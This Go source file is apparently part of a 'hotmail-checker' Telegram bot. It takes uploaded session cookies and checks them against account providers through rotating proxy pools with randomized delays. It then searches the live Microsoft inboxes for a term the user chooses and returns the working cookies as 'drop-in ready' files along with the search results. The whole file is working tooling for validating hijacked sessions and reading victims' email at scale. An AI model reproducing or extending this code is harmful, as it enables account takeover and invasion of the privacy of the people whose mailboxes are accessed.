package bot

import (
	"context"
	"fmt"
	"io"
	"log/slog"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/GT56GT/hotmail-checker/internal/job"
	"github.com/GT56GT/hotmail-checker/internal/provider"

	"github.com/PaulSonOfLars/gotgbot/v2"
	"github.com/PaulSonOfLars/gotgbot/v2/ext"
)

// searchOutcome is the result of searching one Microsoft account.
type searchOutcome struct {
	Email  string
	Items  []provider.SearchItem
	Method string
	Reason string
}

func (b *Bot) onMessage(bot *gotgbot.Bot, ctx *ext.Context) error {
	m := ctx.EffectiveMessage
	user := ctx.EffectiveUser
	if m == nil || user == nil {
		return nil
	}
	if b.cfg.IsBanned(user.Id) {
		return nil
	}

	text := strings.TrimSpace(m.Text)
	p := b.takePending(user.Id)

	if p.kind == pendingProxyAdd {
		return b.saveProxies(bot, m, user.Id, text)
	}

	in := parseIntake("pasted", []byte(text), b.checkers)
	if len(in.cookies) == 0 {
		_, err := m.Reply(bot, usageText, &gotgbot.SendMessageOpts{
			ParseMode: "Markdown",
			LinkPreviewOptions: &gotgbot.LinkPreviewOptions{
				IsDisabled: true,
			},
		})
		return err
	}

	term := ""
	if p.kind == pendingSearch {
		term = p.term
	}
	return b.startJob(bot, m, user.Id, in, term)
}

func (b *Bot) onDocument(bot *gotgbot.Bot, ctx *ext.Context) error {
	m := ctx.EffectiveMessage
	user := ctx.EffectiveUser
	if m == nil || user == nil || m.Document == nil {
		return nil
	}
	if b.cfg.IsBanned(user.Id) {
		return nil
	}
	if m.Document.FileSize > maxDocBytes {
		_, err := m.Reply(bot, "File too large. Limit is 20 MB.", nil)
		return err
	}

	data, err := b.downloadFile(m.Document.FileId)
	if err != nil {
		slog.Warn("document download failed", "err", err)
		_, rerr := m.Reply(bot, "Could not download that file.", nil)
		return rerr
	}

	p := b.takePending(user.Id)
	if p.kind == pendingProxyAdd {
		return b.saveProxies(bot, m, user.Id, string(data))
	}

	term := ""
	if p.kind == pendingSearch {
		term = p.term
	}

	name := m.Document.FileName
	if name == "" {
		name = "upload"
	}
	return b.startJob(bot, m, user.Id, parseIntake(name, data, b.checkers), term)
}

// startJob validates an intake, enforces fairness limits, and runs the check.
// When term is non-empty every live Microsoft account is searched afterwards.
func (b *Bot) startJob(bot *gotgbot.Bot, m *gotgbot.Message, userID int64, in intake, term string) error {
	if len(in.cookies) == 0 {
		var sb strings.Builder
		sb.WriteString("No valid cookies found.")
		if len(in.issues) > 0 {
			sb.WriteString("\n\n" + summariseIssues(in.issues))
		}
		if len(in.skipped) > 0 {
			sb.WriteString("\n\nSkipped:\n" + previewLines(in.skipped, 4))
		}
		_, err := m.Reply(bot, sb.String(), nil)
		return err
	}

	// A zero cap means no limit; the upload size is the only bound.
	if b.cfg.MaxCookiesPerJob > 0 && len(in.cookies) > b.cfg.MaxCookiesPerJob {
		_, err := m.Reply(bot, fmt.Sprintf(
			"Too many accounts: %d. Limit is %d per job.", len(in.cookies), b.cfg.MaxCookiesPerJob), nil)
		return err
	}

	j, err := b.reg.Begin(context.Background(), userID, len(in.cookies))
	if err != nil {
		_, rerr := m.Reply(bot, friendlyRegistryError(err), nil)
		return rerr
	}
	j.Source = in.source
	defer b.reg.Finish(userID)

	headline := fmt.Sprintf("Queued %d account(s) — %s\nfrom %s. Starting…",
		len(in.cookies), in.serviceSummary(), in.source)
	if term != "" {
		headline = fmt.Sprintf("Queued %d account(s) — %s\nfrom %s.\nChecking, then searching Microsoft inboxes for \"%s\"…",
			len(in.cookies), in.serviceSummary(), in.source, term)
	}
	if len(in.skipped) > 0 {
		headline += fmt.Sprintf("\n(%d file(s) skipped)", len(in.skipped))
	}

	status, err := m.Reply(bot, headline, nil)
	if err != nil {
		return err
	}

	b.runJob(bot, j, in.cookies, status, term)
	return nil
}

func (b *Bot) runJob(bot *gotgbot.Bot, j *job.Job, cookies []tagged, status *gotgbot.Message, term string) {
	progressDone := make(chan struct{})
	var progressWG sync.WaitGroup
	progressWG.Add(1)
	go func() {
		defer progressWG.Done()
		b.progressLoop(bot, j, status, term, progressDone)
	}()

	work := make(chan tagged)
	var workers sync.WaitGroup

	n := b.cfg.Concurrency
	if n > len(cookies) {
		n = len(cookies)
	}
	if n < 1 {
		n = 1
	}

	for i := 0; i < n; i++ {
		workers.Add(1)
		go func() {
			defer workers.Done()
			for t := range work {
				if j.Ctx.Err() != nil {
					return
				}
				b.checkOne(j, t)

				select {
				case <-time.After(jitter()):
				case <-j.Ctx.Done():
					return
				}
			}
		}()
	}

feed:
	for _, t := range cookies {
		select {
		case work <- t:
		case <-j.Ctx.Done():
			break feed
		}
	}
	close(work)
	workers.Wait()

	close(progressDone)
	progressWG.Wait()

	var searches map[int]searchOutcome
	if term != "" && j.Ctx.Err() == nil {
		searches = b.runSearches(bot, j, status, term)
	}

	j.Done()
	b.deliver(bot, j, status, searches, term)
}

func (b *Bot) checkOne(j *job.Job, t tagged) {
	ctx, cancel := context.WithTimeout(j.Ctx, b.cfg.Timeout+10*time.Second)
	defer cancel()

	pool := b.pools.Pool(ctx, j.UserID)
	entry, release, err := pool.Acquire(ctx)
	if err != nil && pool != b.pools.Global() {
		pool = b.pools.Global()
		entry, release, err = pool.Acquire(ctx)
	}
	if err != nil {
		j.AddErr("pool: " + err.Error())
		return
	}
	defer release()

	res := t.checker.Check(ctx, t.cookie, entry.URL)

	switch res.Verdict {
	case provider.Live:
		pool.Report(entry, true)
		j.AddHit(job.Hit{
			Provider: t.checker.Name(),
			Email:    res.Email,
			Name:     res.Name,
			Cookie:   t.cookie.Header(),
			Cookies:  t.cookie.Values,
			Proxy:    res.Proxy,
			Meta:     res.Meta,
		})

	case provider.Dead:
		pool.Report(entry, true)
		j.AddDead(t.cookie.Label())

	case provider.Challenged:
		// The session authenticated but needs consent or re-auth, so the proxy
		// is working — do not penalise it.
		pool.Report(entry, true)
		j.AddChallenged(t.checker.Label() + ": " + res.Reason)

	case provider.RateLimited:
		pool.Report(entry, false)
		j.AddErr("rate limited")

	default:
		pool.Report(entry, false)
		j.AddErr(res.Reason)
	}
}

// runSearches queries Microsoft inboxes. Results are keyed by index in the
// hits slice so mixed-service batches stay aligned.
func (b *Bot) runSearches(bot *gotgbot.Bot, j *job.Job, status *gotgbot.Message, term string) map[int]searchOutcome {
	if b.ms == nil {
		return nil
	}

	hits, _, _, _ := j.Results()

	var idx []int
	for i, h := range hits {
		if h.Provider == "microsoft" {
			idx = append(idx, i)
		}
	}
	if len(idx) == 0 {
		return nil
	}

	limit := b.cfg.MaxSearchAccounts
	if limit <= 0 || len(idx) < limit {
		limit = len(idx)
	}
	idx = idx[:limit]

	_, _, _ = status.EditText(bot, &gotgbot.EditMessageTextOpts{
		Text: fmt.Sprintf("Checking done. Searching %d Microsoft inbox(es) for \"%s\"…", len(idx), term),
	})

	out := make(map[int]searchOutcome, len(idx))
	sem := make(chan struct{}, 3)
	var wg sync.WaitGroup
	var mu sync.Mutex

	for _, hitIdx := range idx {
		wg.Add(1)
		go func(hitIdx int, h job.Hit) {
			defer wg.Done()

			select {
			case sem <- struct{}{}:
			case <-j.Ctx.Done():
				mu.Lock()
				out[hitIdx] = searchOutcome{Email: h.Email, Reason: "cancelled"}
				mu.Unlock()
				return
			}
			defer func() { <-sem }()

			ctx, cancel := context.WithTimeout(j.Ctx, b.cfg.Timeout+20*time.Second)
			defer cancel()

			pool := b.pools.Pool(ctx, j.UserID)
			entry, release, err := pool.Acquire(ctx)
			if err != nil && pool != b.pools.Global() {
				pool = b.pools.Global()
				entry, release, err = pool.Acquire(ctx)
			}
			if err != nil {
				mu.Lock()
				out[hitIdx] = searchOutcome{Email: h.Email, Reason: "pool: " + err.Error()}
				mu.Unlock()
				return
			}
			defer release()

			ck := &provider.Cookie{Values: h.Cookies}
			res := b.ms.Search(ctx, ck, entry.URL, term, b.cfg.SearchResultsLimit)

			mu.Lock()
			out[hitIdx] = searchOutcome{
				Email:  h.Email,
				Items:  res.Items,
				Method: res.Method,
				Reason: res.Reason,
			}
			mu.Unlock()
		}(hitIdx, hits[hitIdx])
	}
	wg.Wait()

	return out
}

func (b *Bot) progressLoop(bot *gotgbot.Bot, j *job.Job, status *gotgbot.Message, term string, done <-chan struct{}) {
	t := time.NewTicker(3 * time.Second)
	defer t.Stop()

	var lastEdit time.Time

	for {
		select {
		case <-done:
			return
		case <-t.C:
			// Telegram allows roughly one edit per second per chat; stay under
			// it so the bot is not throttled mid-job.
			if time.Since(lastEdit) < 2*time.Second {
				continue
			}

			c := j.Counts()
			suffix := ""
			if term != "" {
				suffix = fmt.Sprintf("\nsearch \"%s\" after check", term)
			}
			text := fmt.Sprintf(
				"Checking…\n`%s` %d/%d\n\nlive %d · dead %d · challenge %d · error %d\nelapsed %s%s",
				bar(c.Done(), j.Total), c.Done(), j.Total,
				c.Live, c.Dead, c.Challenged, c.Errors,
				j.Elapsed().Round(time.Second), suffix,
			)

			if _, _, err := status.EditText(bot, &gotgbot.EditMessageTextOpts{
				Text:      text,
				ParseMode: "Markdown",
			}); err == nil {
				lastEdit = time.Now()
			}
		}
	}
}

func (b *Bot) deliver(bot *gotgbot.Bot, j *job.Job, status *gotgbot.Message, searches map[int]searchOutcome, term string) {
	hits, dead, challenged, errs := j.Results()

	summary := fmt.Sprintf(
		"*Done* in %s\n\n✅ live %d\n❌ dead %d\n🔒 challenge %d\n⚠️ error %d\n\n%d checked",
		j.Elapsed().Round(time.Second), len(hits), len(dead), len(challenged), len(errs), j.Total,
	)
	if term != "" {
		summary += fmt.Sprintf("\n\n🔎 %d match(es) for \"%s\"", countMatches(searches), term)
	}

	if _, _, err := status.EditText(bot, &gotgbot.EditMessageTextOpts{
		Text:      summary,
		ParseMode: "Markdown",
	}); err != nil {
		slog.Debug("status edit failed", "err", err)
	}

	chatID := status.Chat.Id
	bun := buildBundle(hits, dead, challenged, errs, searches, term, j)

	if len(hits) > 0 {
		if _, err := bot.SendDocument(chatID,
			gotgbot.InputFileByReader(fmt.Sprintf("cookies_%s.txt", j.ID), strings.NewReader(bun.cookies)),
			&gotgbot.SendDocumentOpts{
				Caption: fmt.Sprintf("%d working cookie(s) — drop-in ready", len(hits)),
			}); err != nil {
			slog.Warn("send cookies file failed", "err", err)
		}
	} else {
		_, _ = bot.SendMessage(chatID, "No working cookies in this batch.", nil)
	}

	if _, err := bot.SendDocument(chatID,
		gotgbot.InputFileByReader(fmt.Sprintf("report_%s.txt", j.ID), strings.NewReader(bun.report)),
		&gotgbot.SendDocumentOpts{
			Caption: "Full report",
		}); err != nil {
		slog.Warn("send report failed", "err", err)
	}

	// A ZIP keeps large or searched jobs to a single download.
	if term != "" || len(hits)+len(dead) > 50 {
		zipped, err := zipBundle(bun, term)
		if err != nil {
			slog.Warn("zip bundle failed", "err", err)
			return
		}
		if _, err := bot.SendDocument(chatID,
			gotgbot.InputFileByReader(fmt.Sprintf("results_%s.zip", j.ID), strings.NewReader(string(zipped))),
			&gotgbot.SendDocumentOpts{
				Caption: "report.txt · cookies.txt · accounts.csv · dead.txt · search.csv",
			}); err != nil {
			slog.Warn("send bundle failed", "err", err)
		}
	}
}

func countMatches(searches map[int]searchOutcome) int {
	n := 0
	for _, s := range searches {
		n += len(s.Items)
	}
	return n
}

func (b *Bot) downloadFile(fileID string) ([]byte, error) {
	f, err := b.client.GetFile(fileID, nil)
	if err != nil {
		return nil, err
	}

	url := fmt.Sprintf("https://api.telegram.org/file/bot%s/%s", b.client.Token, f.FilePath)

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return nil, err
	}
	resp, err := b.http.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("getFile returned %d", resp.StatusCode)
	}
	return io.ReadAll(io.LimitReader(resp.Body, maxDocBytes))
}

func jitter() time.Duration {
	return time.Duration(200+rand.Intn(500)) * time.Millisecond
}

func friendlyRegistryError(err error) string {
	msg := err.Error()
	switch {
	case strings.Contains(msg, "cooldown"):
		return "Cooling down. " + msg
	case strings.Contains(msg, "already running"):
		return "A job is already running. Send /cancel to stop it."
	}
	return msg
}

func summariseIssues(issues []error) string {
	const max = 4
	var sb strings.Builder
	for i, err := range issues {
		if i >= max {
			fmt.Fprintf(&sb, "…and %d more\n", len(issues)-max)
			break
		}
		sb.WriteString("• " + err.Error() + "\n")
	}
	return strings.TrimSpace(sb.String())
}

func joinComma(items []string) string {
	return strings.Join(items, ", ")
}
